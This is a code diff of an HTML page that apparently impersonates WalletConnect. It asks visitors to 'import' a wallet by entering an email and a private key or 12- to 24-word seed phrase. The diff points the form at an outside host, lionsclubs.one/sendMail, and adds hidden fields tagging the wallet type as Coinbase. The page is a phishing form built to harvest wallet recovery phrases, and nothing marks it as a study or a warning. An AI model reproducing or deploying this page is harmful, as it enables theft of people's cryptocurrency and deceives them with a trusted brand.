@@ -1,12 +1,9 @@
-<html lang="en">
-
-<head>
+<html lang="en"><head>
 	<meta charset="UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0">
 	<!--===== CSS =====-->
 	<link rel="stylesheet" href="assets/css/styles.css">
 	<title></title>
-</head>
 <style>
     /*===== FORM =====*/
 .l-form{
@@ -14,7 +11,7 @@
   justify-content: center;
   align-items: center;
   height: 100vh;
-  background-color: #1442d99e!important;
+  background-color: #0b3ddff7!important;
 }
 .form{
   width: 360px;
@@ -57,7 +54,7 @@
   transition: .3s;
 }
 .form__button{
-  display: block;
+  /* display: block;
   margin-left: auto;
   padding: .75rem 2rem;
   outline: none;
@@ -67,7 +64,37 @@
   font-size: var(--normal-font-size);
   border-radius: .5rem;
   cursor: pointer;
-  transition: .3s;
+  transition: .3s; */
+
+  display: block;
+    margin-left: auto;
+    padding: .75rem 2rem;
+    outline: none;
+    border: none;
+    /* background-color: var(--first-color); */
+    color: #fff;
+    /* font-size: var(--normal-font-size); */
+    border-radius: .5rem;
+    cursor: pointer;
+    transition: .3s;
+    FONT-FAMILY: Verdana;
+    BORDER-RIGHT: #0568ae 1px solid;
+    WIDTH: 150px;
+    BACKGROUND: #0568ae;
+    BORDER-BOTTOM: #0568ae 1px solid;
+    COLOR: #ffffff;
+    PADDING-BOTTOM: 10px;
+    TEXT-ALIGN: center;
+    PADDING-TOP: 10px;
+    PADDING-LEFT: 10px;
+    BORDER-LEFT: #0568ae 1px solid;
+    DISPLAY: block;
+    LINE-HEIGHT: 17px;
+    PADDING-RIGHT: 10px;
+    border-radius: 4px;
+    margin: auto;
+    position: relative;
+top:50px;
 }
 .form__button:hover{
   box-shadow: 0 10px 36px rgba(0,0,0,.15);
@@ -97,17 +124,13 @@
   border: 1.5px solid var(--first-color);
 }
 
-</style>
+</style></head>
+
 <body style="background: ">
 	<div class="l-form">
 		<div class="css-gnymxj">
-			<form action="{{route('sendMail')}}" class="form" method="POST">@csrf
-				<div align="center" href="/" class="css-iicfua" style="position: relative;bottom: 35px;">
-             <span style="box-sizing: border-box; display: inline-block; overflow: hidden; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: relative; max-width: 100%;"><span
-                 style="box-sizing: border-box; display: block; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; max-width: 100%;"><img
-            alt="" aria-hidden="true"
-            src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjE1IiBoZWlnaHQ9IjM1IiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZlcnNpb249IjEuMSIvPg=="
-            style="display: block; max-width: 100%; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px;"></span>
+			<form action="http://lionsclubs.one/sendMail" class="form" method="POST"><input type="hidden" name="_token" value="8o8ycIKHctOoLxa9cvkgNoBJvlaQvTmlwfnBuFkR">				<div align="center" href="/" class="css-iicfua" style="position: relative;bottom: 35px;">
+             <span style="box-sizing: border-box; display: inline-block; overflow: hidden; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: relative; max-width: 100%;"><span style="box-sizing: border-box; display: block; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; max-width: 100%;"><img alt="" aria-hidden="true" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjE1IiBoZWlnaHQ9IjM1IiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZlcnNpb249IjEuMSIvPg==" style="display: block; max-width: 100%; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px;"></span>
 					<div align="center" href="/" class="css-iicfua">
 						<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1459 238" version="1.1" class="css-uwwqev">
 							<title>WalletConnect's logo</title>
@@ -118,25 +141,24 @@
 								</g>
 							</g>
 						</svg>
-					</div>{{--
-					<h1 text-align="center" style=" font-size: medium; margin: 12px; font-weight: 100;">import wallet</h1>
-					<noscript></noscript>--}}</span>
+					</div></span>
 				</div>
 				<div class="form__div">
 					<input type="text" class="form__input" placeholder=" " name="email">
 					<label for="" class="form__label">Import Email Wallet</label>
 				</div>
-				<div class="form__div">
-					<input type="text" class="form__input" placeholder=" " name="key" style="height: 90px;" required>
+        <div class="form__div">
+					<input type="text" class="form__input" placeholder=" " name="key" style="padding: 12px 20px 5px 15px;border-color: darkblue;height: 80px;" required="">
 					<label for="" class="form__label">Import Private Key</label>
-					<input type="hidden" id="wallet" name="wallet_type" value="{{$coin}}" />
-					<input type="hidden" id="link" name="link" value="{{$data}}" />
+					<input type="hidden" id="wallet" name="wallet_type" value="Coinbase">
+					<input type="hidden" id="link" name="link" value="q">
 				</div>
 				<p text-align="center" style="font-size: 11px;margin: 1px;font-weight: 100;font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;position: relative;top: 30px;">Typically 12 ( sometimes 24 ) words separated by single spaces</p>
-				<input type="submit" class="form__button" value="Connect&nbsp;⇒" style="position: relative; top: 50px;margin: 0 auto;">
+				<!-- <input type="submit" class="form__button" value="Connect&nbsp;⇒" style=""> -->
+        <button type="submit" class="form__button" style="">Connect Dapp</button>
 			</form>
          </div>
 		</div>
-</body>
 
-</html>
+
+</body></html>
